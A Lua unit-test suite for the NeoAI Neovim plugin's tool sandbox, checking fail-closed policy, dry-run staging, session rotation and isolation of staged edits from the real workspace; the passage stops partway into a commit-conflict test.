--- 沙箱专项测试
--- @module NeoAI.tests.test_sandbox
--- 覆盖：加载器强制附加规格、fail-closed、状态机/幂等/fencing、策略聚合、
--- dry-run 不改真实工作区、CAS 发布与冲突、运行时能力探测与进程隔离。

local tests = require("NeoAI.tests")

--- 保存/恢复全局配置
--- 测试普遍把 /tmp（vim.fn.tempname）当作工作区使用：默认关闭「临时根不产生候选」
--- （`ephemeral_roots = {}`），需要验证该行为的用例可显式传入 ephemeral_roots。
local function with_config(overrides, fn)
  local config_store = require("NeoAI.kernel.config_store")
  local saved = config_store.get_all()
  local merged = vim.deepcopy(overrides or {})
  merged.tools = merged.tools or {}
  merged.tools.sandbox = merged.tools.sandbox or {}
  if merged.tools.sandbox.ephemeral_roots == nil then
    merged.tools.sandbox.ephemeral_roots = {}
  end
  config_store.load(merged)
  local ok, err = pcall(fn)
  config_store.load(saved)
  if not ok then error(err, 0) end
end

local function trim(s)
  return (tostring(s or ""):gsub("%s+$", ""))
end

tests.suite("sandbox", function(_, it)
  it("加载器为所有已注册工具附加沙箱规格", function(t)
    local registry = require("NeoAI.tools.registry")
    local missing = {}
    for _, tool in ipairs(registry.list()) do
      if not tool.__sandboxed then missing[#missing + 1] = tool.name end
    end
    t.eq(0, #missing, "未附加规格的工具: " .. table.concat(missing, ","))
    t.eq("fs_write", registry.get("edit_file").__sandbox_spec.effect)
    t.eq("process", registry.get("run_command").__sandbox_spec.effect)
    t.eq("read", registry.get("read_file").__sandbox_spec.effect)
    t.eq("in_process", registry.get("todo_write").__sandbox_spec.effect)
  end)

  it("沙箱服务缺失且 fail_closed 时拒绝执行（不静默降级）", function(t)
    local services = require("NeoAI.kernel.services")
    local saved = services.use("services.sandbox")
    t.not_nil(saved, "默认应已提供 services.sandbox")
    services.revoke("services.sandbox")
    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = { enabled = true, fail_closed = true } } }, function()
      local done = false
      require("NeoAI.tools").execute("read_file", { filepath = "/tmp/x", description = "t" }, {})
        :then_(function() done = true; t.true_(false, "应 fail-closed") end, function(e)
          t.matches("沙箱", tostring(e and e.message or e))
          done = true
        end)
      t.true_(vim.wait(2000, function() return done end), "应快速拒绝")
    end)
    services.provide("services.sandbox", saved)
  end)

  it("控制面：幂等键、状态迁移与 fencing", function(t)
    local control = require("NeoAI.sandbox.control")
    control.reset()
    t.true_(control.claim_idempotency("k1", "h1"))
    t.true_(control.claim_idempotency("k1", "h1"), "同键同请求应放行")
    local ok, reason = control.claim_idempotency("k1", "h2")
    t.false_(ok, "同键不同请求应拒绝")
    t.matches("IDEMPOTENCY", reason)

    local attempt = control.new_attempt("edit_file", {}, {}, { effect = "fs_write" })
    t.eq("RECEIVED", attempt.state)
    t.true_(control.transition(attempt, "PARSED"))
    t.false_(control.transition(attempt, "COMMITTED"), "非法迁移应失败")
    t.eq("PARSED", attempt.state)

    local token = control.acquire_lease(attempt.command_id, 60)
    t.true_(control.check_lease(attempt.command_id, token))
    control.acquire_lease(attempt.command_id, 60)
    local ok2, r2 = control.check_lease(attempt.command_id, token)
    t.false_(ok2, "旧 fencing token 应被拒绝")
    t.matches("STALE", r2)
    control.release_lease(attempt.command_id)
  end)

  it("策略：硬拒绝高于确认，网络默认放行、offline 时才拒绝", function(t)
    local policy = require("NeoAI.sandbox.policy")
    -- 默认（offline=false）：网络放行，仅记录
    with_config({ tools = { sandbox = { policy = { deny_tools = { "run_command" } } } } }, function()
      local v = policy.evaluate({ tool = "run_command", effect = "process" })
      t.eq("DENY", v.decision)
      t.true_(vim.tbl_contains(v.reason_codes, "TOOL_HARD_DENIED"))
      local v2 = policy.evaluate({ tool = "web_fetch", effect = "network" })
      t.eq("ALLOW", v2.decision, "网络默认应放行（仅记录）")
    end)
    -- 显式离线：拒绝
    with_config({ tools = { sandbox = { offline = true } } }, function()
      local v3 = policy.evaluate({ tool = "web_fetch", effect = "network" })
      t.eq("DENY", v3.decision)
      t.true_(vim.tbl_contains(v3.reason_codes, "NETWORK_OFFLINE"))
    end)
  end)

  it("策略：规则异常统一产生 DENY（POLICY_EVALUATION_FAILED）", function(t)
    local policy = require("NeoAI.sandbox.policy")
    with_config({ tools = { sandbox = { policy = { rules = { function() error("boom") end } } } } }, function()
      local v = policy.evaluate({ tool = "x", effect = "read" })
      t.eq("DENY", v.decision)
      t.true_(vim.tbl_contains(v.reason_codes, "POLICY_EVALUATION_FAILED"))
    end)
  end)

  it("策略：死循环规则有界终止并 DENY", function(t)
    local policy = require("NeoAI.sandbox.policy")
    policy.set_limits({ instruction_budget = 1000 })
    with_config({ tools = { sandbox = { policy = { rules = { function() while true do end end } } } } }, function()
      local v = policy.evaluate({ tool = "x", effect = "read" })
      t.eq("DENY", v.decision)
    end)
    policy.reset()
  end)

  it("dry_run：不写真实工作区，冻结候选后可 CAS 发布", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = { mode = "dry_run" } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "base\n")
      local done = false
      require("NeoAI.tools").execute("edit_file", {
        filepath = p, mode = "write", content = "next\n", description = "t",
      }, {}):then_(function(r)
        t.true_(not tostring(r):find("沙箱", 1, true), "结果不应向模型暴露沙箱暂存")
        t.eq("base", trim(fs.read_file(p)), "dry_run 不应改真实工作区")
        local list = sandbox.list()
        t.eq(1, #list, "应有一个待处理候选")
        local res = sandbox.commit(list[1].candidate_digest)
        t.true_(res.ok, tostring(res.reason))
        t.eq("next", trim(fs.read_file(p)), "commit 后应写入真实工作区")
        fs.delete_file(p)
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(3000, function() return done end), "edit_file 应完成")
    end)
  end)

  it("工作区映射：同一文件多次编辑叠加、读回沙箱内容、结果路径为原文件", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "A B\n")
      local tools = require("NeoAI.tools")
      local r1, read_back
      local done = false
      tools.execute("edit_file", {
        filepath = p, mode = "edit", edits = { { old_text = "A", new_text = "X" } }, description = "t",
      }, {}):then_(function(r)
        r1 = r
        return tools.execute("read_file", { filepath = p, description = "t" }, {})
      end):then_(function(rr)
        read_back = rr
        return tools.execute("edit_file", {
          filepath = p, mode = "edit", edits = { { old_text = "B", new_text = "Y" } }, description = "t",
        }, {})
      end):then_(function()
        -- 结果路径应为原文件，不含沙箱暂存路径
        t.matches(vim.pesc(p), r1, "edit_file 结果应含原文件路径")
        t.true_(not tostring(r1):find("/workspace/", 1, true), "结果不应暴露沙箱暂存路径")
        -- 读回的是沙箱中尚未发布的修改
        t.matches("X B", read_back, "read_file 应读到沙箱暂存内容")
        -- 第二次编辑应叠加在第一次之上（而非从真实文件重来），并取代旧待审项
        local items = sandbox.list_reviews({ review_state = "PENDING" })
        t.eq(1, #items, "后一次编辑应取代前一次待审（只保留最新版本）")
        t.eq("X Y\n", items[1].files[1].content, "候选内容应为叠加后的 X Y")
        local superseded = 0
        for _, it in ipairs(sandbox.list_reviews()) do
          if it.review_state == "SUPERSEDED" then superseded = superseded + 1 end
        end
        t.eq(1, superseded, "旧待审项应被标记 SUPERSEDED")
        local res = sandbox.apply(items[1].change_set_id, { auto_approve = true })
        t.true_(res.ok, tostring(res.reason))
        t.matches("X Y", fs.read_file(p) or "")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(5000, function() return done end), "edit_file 应完成")
      fs.delete_file(p)
    end)
  end)

  it("待审：应用被取代的旧变更单元时重定向到最新版本（不报 NOT_APPROVED）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "A\n")
      local tools = require("NeoAI.tools")
      local done = false
      tools.execute("edit_file", {
        filepath = p, mode = "write", content = "v1\n", description = "t",
      }, {}):then_(function()
        return tools.execute("edit_file", {
          filepath = p, mode = "write", content = "v2\n", description = "t",
        }, {})
      end):then_(function()
        local stale
        for _, it in ipairs(sandbox.list_reviews()) do
          if it.review_state == "SUPERSEDED" then
            for _, f in ipairs(it.files or {}) do
              if f.path == p then stale = it.change_set_id end
            end
          end
        end
        t.not_nil(stale, "应存在被取代的旧变更单元")
        local res = sandbox.apply(stale, { auto_approve = true })
        t.true_(res.ok, "旧 id 应用应重定向到最新并成功: " .. tostring(res.reason))
        t.matches("v2", fs.read_file(p) or "", "应应用最新内容")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(5000, function() return done end), "edit_file 应完成")
      fs.delete_file(p)
    end)
  end)

  it("沙箱不可见：list/search/exists 反映暂存改动且不泄露暂存路径", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local dir = vim.fn.tempname()
      fs.ensure_dir(dir)
      local p_mod = dir .. "/mod.txt"
      local p_new = dir .. "/new.txt"
      local p_del = dir .. "/del.txt"
      fs.write_file(p_mod, "old content\n")
      fs.write_file(p_del, "delete me\n")
      local tools = require("NeoAI.tools")
      local done = false
      tools.execute("edit_file", {
        filepath = p_mod, mode = "write", content = "staged unique content\n", description = "t",
      }, {}):then_(function()
        return tools.execute("edit_file", {
          filepath = p_new, mode = "write", content = "brand new\n", description = "t",
        }, {})
      end):then_(function()
        return tools.execute("delete_file", { filepath = p_del, description = "t" }, {})
      end):then_(function()
        return tools.execute("list_files", { path = dir, description = "t" }, {})
      end):then_(function(r)
        local s = tostring(r)
        t.matches("new%.txt", s, "新建文件应出现在列表")
        t.matches("mod%.txt", s, "修改文件应出现在列表")
        t.true_(not s:find("del%.txt"), "已删除文件不应出现在列表")
        t.true_(not s:find("sessions", 1, true), "列表不应泄露沙箱暂存路径")
        return tools.execute("search_files", { path = dir, query = "staged unique", description = "t" }, {})
      end):then_(function(r)
        local s = tostring(r)
        t.matches("staged unique", s, "搜索应命中暂存内容")
        t.matches("mod%.txt", s, "搜索应指向真实文件路径")
        t.true_(not s:find("sessions", 1, true), "搜索不应泄露沙箱暂存路径")
        return tools.execute("file_exists", { filepath = p_del, description = "t" }, {})
      end):then_(function(r)
        t.eq("false", tostring(r), "已删除文件 file_exists 应为 false")
        return tools.execute("file_exists", { filepath = p_new, description = "t" }, {})
      end):then_(function(r)
        t.eq("true", tostring(r), "新建文件 file_exists 应为 true")
        t.eq("old content", trim(fs.read_file(p_mod)), "真实文件不应被修改")
        t.true_(fs.exists(p_del), "真实文件不应被删除")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(5000, function() return done end), "沙箱一致性检查应完成")
      vim.fn.delete(dir, "rf")
    end)
  end)

  it("沙箱不可见：treesitter 读取暂存内容且不泄露暂存路径", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".lua"
      fs.write_file(p, "local original = 1\n")
      local done = false
      local tools = require("NeoAI.tools")
      tools.execute("edit_file", {
        filepath = p, mode = "write", content = "local staged_marker = 1\n", description = "t",
      }, {}):then_(function()
        return tools.execute("get_node_code", { filepath = p, line = 1, col = 8, description = "t" }, {})
      end):then_(function(r)
        t.matches("staged_marker", tostring(r), "treesitter 应基于暂存内容解析")
        t.true_(not tostring(r):find("sessions", 1, true), "结果不应泄露暂存路径")
        t.matches("original", fs.read_file(p) or "", "真实文件不应被改动")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(5000, function() return done end), "应完成")
      fs.delete_file(p)
    end)
  end)

  it("沙箱不可见：delete_node 基于暂存内容修改并写回暂存（不二次暂存）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".lua"
      fs.write_file(p, "local orig = 0\n")
      local done = false
      local tools = require("NeoAI.tools")
      tools.execute("edit_file", {
        filepath = p, mode = "write", content = "local a = 1\nlocal b = 2\n", description = "t",
      }, {}):then_(function()
        return tools.execute("delete_node", { filepath = p, line = 2, col = 1, description = "t" }, {})
      end):then_(function()
        return tools.execute("read_file", { filepath = p, description = "t" }, {})
      end):then_(function(r)
        local s = tostring(r)
        t.matches("local a = 1", s, "删除后应保留第一行")
        t.true_(not s:find("local b", 1, true), "被删节点不应再出现")
        t.matches("local orig", fs.read_file(p) or "", "真实文件不应被改动")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(5000, function() return done end), "应完成")
      fs.delete_file(p)
    end)
  end)

  it("read_file 大文件提示路径还原为真实路径（不泄露暂存路径）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, string.rep("line content\n", 100))
      local done = false
      local tools = require("NeoAI.tools")
      tools.execute("edit_file", { filepath = p, mode = "append", content = "appended\n", description = "t" }, {})
        :then_(function()
          return tools.execute("read_file", { filepath = p, description = "t" }, {})
        end):then_(function(r)
          local s = tostring(r)
          t.matches(vim.pesc(p), s, "大文件提示应包含真实文件路径")
          t.true_(not s:find("sessions", 1, true), "不应泄露沙箱暂存路径")
          done = true
        end, function(e)
          t.true_(false, "不应失败: " .. tostring(e and e.message or e))
          done = true
        end)
      t.true_(vim.wait(5000, function() return done end), "应完成")
      fs.delete_file(p)
    end)
  end)

  it("新建文件：首次 edit_file 暂存目录缺失也能成功（不报 ENOENT）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = {
      approval = { mode = "async" },
      sandbox = { mode = "dry_run", workspace_root = vim.fn.tempname() .. "/sb", review = { enabled = true } },
    } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. "/new_file.txt" -- 真实文件不存在
      local done = false
      require("NeoAI.tools").execute("edit_file", {
        filepath = p, mode = "write", content = "hi\n", description = "t",
      }, {}):then_(function(r)
        t.matches("已写入", tostring(r), "新建文件写入应成功")
        t.false_(fs.exists(p), "dry_run 不应写真实文件")
        t.eq(1, #sandbox.list_reviews({ review_state = "PENDING" }), "应冻结一个候选")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(3000, function() return done end), "edit_file 应完成")
    end)
  end)

  it("run_command：同一会话内命令共享可写层（写入可见）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "echo hello > made.txt", description = "t",
      }, {}):then_(function()
        return require("NeoAI.tools").execute("run_command", {
          command = "cat made.txt", description = "t",
        }, {})
      end):then_(function(r)
        t.matches("hello", tostring(r), "同一会话内后续命令应看到前一条命令的写入")
        t.false_(fs.exists(dir .. "/made.txt"), "dry_run 不应写真实工作区")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(10000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("run_command：会话内 shell 状态跨命令保留（export/cd）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      local tools = require("NeoAI.tools")
      tools.execute("run_command", { command = "export SANDBOX_MARKER=neoai123", description = "t" }, {}):then_(function()
        return tools.execute("run_command", { command = "echo $SANDBOX_MARKER", description = "t" }, {})
      end):then_(function(r)
        t.matches("neoai123", tostring(r), "导出变量应在会话内跨命令保留")
        return tools.execute("run_command", { command = "cd /usr", description = "t" }, {})
      end):then_(function()
        return tools.execute("run_command", { command = "pwd", description = "t" }, {})
      end):then_(function(r)
        t.matches("^/usr", tostring(r), "工作目录应在会话内跨命令保留")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(20000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("run_command 与 edit_file 双向互通（同一会话暂存）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    fs.write_file(dir .. "/f.txt", "base\n")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      local tools = require("NeoAI.tools")
      -- 1) edit_file 写入 → run_command 应读到
      tools.execute("edit_file", { filepath = dir .. "/f.txt", mode = "write", content = "edited\n", description = "t" }, {})
        :then_(function()
          return tools.execute("run_command", { command = "cat f.txt", description = "t" }, {})
        end):then_(function(r)
          t.matches("edited", tostring(r), "run_command 应读到 edit_file 的暂存改动")
          -- 2) run_command 追加 → read_file 应读到叠加后的内容
          return tools.execute("run_command", { command = "echo fromcmd >> f.txt", description = "t" }, {})
        end):then_(function()
          return tools.execute("read_file", { filepath = dir .. "/f.txt", description = "t" }, {})
        end):then_(function(r)
          t.matches("edited", tostring(r), "read_file 应保留 edit_file 的改动")
          t.matches("fromcmd", tostring(r), "read_file 应读到 run_command 的改动")
          t.matches("base", fs.read_file(dir .. "/f.txt") or "", "真实文件不应被改动（dry_run）")
          done = true
        end, function(e)
          t.true_(false, "不应失败: " .. tostring(e and e.message or e))
          done = true
        end)
      t.true_(vim.wait(20000, function() return done end), "应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("沙箱不可见：run_command 反映暂存的新建与删除", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    fs.write_file(dir .. "/del.txt", "bye\n")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      local tools = require("NeoAI.tools")
      tools.execute("edit_file", {
        filepath = dir .. "/new.txt", mode = "write", content = "created\n", description = "t",
      }, {}):then_(function()
        return tools.execute("delete_file", { filepath = dir .. "/del.txt", description = "t" }, {})
      end):then_(function()
        return tools.execute("run_command", {
          command = "cat new.txt; cat del.txt 2>/dev/null || echo MISSING", description = "t",
        }, {})
      end):then_(function(r)
        local s = tostring(r)
        t.matches("created", s, "命令应看到暂存的新建文件")
        t.matches("MISSING", s, "命令应看不到暂存删除的文件")
        t.true_(fs.exists(dir .. "/del.txt"), "真实文件不应被删除")
        t.false_(fs.exists(dir .. "/new.txt"), "dry_run 不应创建真实文件")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(20000, function() return done end), "应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("run_command：可写 cwd 之外的绝对路径（/root）并冻结为候选、不落真实盘", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    local target = "/root/neoai_fsview_test.txt"
    pcall(fs.delete_file, target)
    with_config({ tools = { approval = { mode = "async" }, sandbox = {
      mode = "dry_run", review = { enabled = true },
      process_roots = { "/tmp", "/root" },
    } } }, function()
      sandbox.reset()
      local done = false
      local tools = require("NeoAI.tools")
      tools.execute("run_command", { command = "echo wholefs > " .. target, description = "t" }, {})
        :then_(function()
          return tools.execute("read_file", { filepath = target, description = "t" }, {})
        end):then_(function(r)
          t.matches("wholefs", tostring(r), "read_file 应读到 run_command 对绝对路径的改动")
          t.false_(fs.exists(target), "dry_run 不应写真实文件系统")
          done = true
        end, function(e)
          t.true_(false, "不应失败: " .. tostring(e and e.message or e))
          done = true
        end)
      t.true_(vim.wait(20000, function() return done end), "应完成")
    end)
    vim.fn.chdir(prev)
    pcall(fs.delete_file, target)
    vim.fn.delete(dir, "rf")
  end)

  it("沙箱会话：循环内共用，agentEnd 轮换但保留暂存内容", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.candidate")
    local control = require("NeoAI.sandbox.control")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "base\n")

      local a1 = control.new_attempt("edit_file", {}, {}, { effect = "fs_write" })
      candidate.begin(a1, store.root())
      local staged1 = candidate.stage_path(a1.attempt_id, p)
      fs.write_file(staged1, "edit1\n")
      local sid1 = candidate.session_id()
      t.not_nil(sid1, "首次暂存应建立会话")

      -- agentEnd：轮换到新会话
      local sid2 = candidate.rotate_session()
      t.ne(sid1, sid2, "agentEnd 后应使用不同沙箱会话")

      -- 新会话仍应看到未发布的修改（一致性）
      local a2 = control.new_attempt("edit_file", {}, {}, { effect = "fs_write" })
      candidate.begin(a2, store.root())
      local staged2 = candidate.stage_path(a2.attempt_id, p)
      t.eq("edit1\n", fs.read_file(staged2), "轮换后应保留未发布的修改")
      t.true_(staged2 ~= staged1, "轮换后应使用新的暂存路径")

      candidate.cleanup(a1.attempt_id)
      candidate.cleanup(a2.attempt_id)
      fs.delete_file(p)
    end)
  end)

  it("沙箱会话：目录暂存跨轮换保留为目录（不被误判删除）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.candidate")
    local control = require("NeoAI.sandbox.control")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local dir = vim.fn.tempname() .. "-d"
      local a1 = control.new_attempt("create_directory", {}, {}, { effect = "fs_write" })
      candidate.begin(a1, store.root())
      local staged1 = candidate.stage_path(a1.attempt_id, dir)
      fs.ensure_dir(staged1)
      candidate.rotate_session()
      local a2 = control.new_attempt("create_directory", {}, {}, { effect = "fs_write" })
      candidate.begin(a2, store.root())
      local staged2 = candidate.stage_path(a2.attempt_id, dir)
      t.eq(1, vim.fn.isdirectory(staged2), "轮换后目录暂存应保留为目录")
      local entry
      for _, o in ipairs(candidate.workspace_overrides()) do
        if o.real == dir then entry = o end
      end
      t.not_nil(entry, "应保留目录暂存条目")
      t.false_(entry.deleted, "目录不应被标记为删除（否则物化为 whiteout 会损坏视图）")
      candidate.cleanup(a1.attempt_id)
      candidate.cleanup(a2.attempt_id)
    end)
  end)

  it("沙箱：文件写入工具拒绝目录目标（避免把目录覆盖成文件）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done, err = false, nil
      require("NeoAI.tools").execute("edit_file", {
        filepath = dir, mode = "write", content = "oops\n", description = "t",
      }, {}):then_(function()
        done = true
      end, function(e)
        err = e; done = true
      end)
      t.true_(vim.wait(5000, function() return done end), "应完成")
      t.matches("SANDBOX_TARGET_IS_DIR", tostring(err and err.message or err), "应拒绝目录目标")
      t.eq(1, vim.fn.isdirectory(dir), "目录应保持为目录")
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("沙箱：create_directory 的新目录对 run_command 可见", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local newdir = dir .. "/sub"
      local done = false
      require("NeoAI.tools").execute("create_directory", { filepath = newdir, description = "t" }, {}):then_(function()
        return require("NeoAI.tools").execute("run_command", {
          command = "test -d " .. newdir .. " && echo ISDIR", description = "t",
        }, {})
      end):then_(function(r)
        t.matches("ISDIR", tostring(r), "run_command 应能看到 create_directory 新建的目录")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e)); done = true
      end)
      t.true_(vim.wait(20000, function() return done end), "应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("沙箱会话：生成结束事件触发轮换", function(t)
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.candidate")
    local control = require("NeoAI.sandbox.control")
    local store = require("NeoAI.sandbox.store")
    local event_bus = require("NeoAI.kernel.event_bus")
    local events = require("NeoAI.kernel.events")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      sandbox.watch_sessions()
      local a = control.new_attempt("edit_file", {}, {}, { effect = "fs_write" })
      candidate.begin(a, store.root())
      local sid1 = sandbox.session_id()
      t.not_nil(sid1)
      event_bus.emit(events.GENERATION_COMPLETED, { agent_id = "a" })
      t.ne(sid1, sandbox.session_id(), "生成结束应轮换沙箱会话")
      candidate.cleanup(a.attempt_id)
    end)
  end)

  it("沙箱会话：主 Agent 忙碌时子 Agent 结束不轮换", function(t)
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.candidate")
    local control = require("NeoAI.sandbox.control")
    local store = require("NeoAI.sandbox.store")
    local chat = require("NeoAI.services.chat_service")
    local event_bus = require("NeoAI.kernel.event_bus")
    local events = require("NeoAI.kernel.events")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local agent = chat.new_session({})
      sandbox.watch_sessions()
      local a = control.new_attempt("edit_file", {}, {}, { effect = "fs_write" })
      candidate.begin(a, store.root())
      local sid1 = sandbox.session_id()
      -- 主 Agent 忙碌（tool_running）：子 Agent 完成不应轮换（否则会删主循环在用的暂存目录）
      agent:set_state("tool_running")
      event_bus.emit(events.GENERATION_COMPLETED, { agent_id = "sub_agent_xyz" })
      t.eq(sid1, sandbox.session_id(), "主 Agent 忙碌时子 Agent 结束不应轮换")
      -- 主 Agent 完成：应轮换
      agent:set_state("idle")
      event_bus.emit(events.GENERATION_COMPLETED, { agent_id = agent.id })
      t.ne(sid1, sandbox.session_id(), "主 Agent 完成应轮换")
      candidate.cleanup(a.attempt_id)
    end)
  end)

  it("沙箱会话：轮换不立即删除旧暂存目录（避免 bind 源被删）", function(t)
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.candidate")
    local control = require("NeoAI.sandbox.control")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local a = control.new_attempt("edit_file", {}, {}, { effect = "fs_write" })
      candidate.begin(a, store.root())
      local old_proc = candidate.process_dir()
      t.true_(vim.fn.isdirectory(old_proc) == 1, "旧进程目录应存在")
      candidate.rotate_session()
      -- 仍有在途尝试：旧目录不得被删除（否则运行中命令的 bind 源突然消失）
      t.true_(vim.fn.isdirectory(old_proc) == 1, "有在途尝试时旧目录不应被删")
      candidate.cleanup(a.attempt_id)
      -- 尝试结束后异步清理（线程池）
      local ok = vim.wait(5000, function() return vim.fn.isdirectory(old_proc) ~= 1 end)
      t.true_(ok, "尝试结束后旧目录应被异步清理")
    end)
  end)

  it("commit：基线被他人修改后 CAS 失败（CONFLICT），不覆盖", function(t)
    local fs = require("NeoAI.utils.fs")
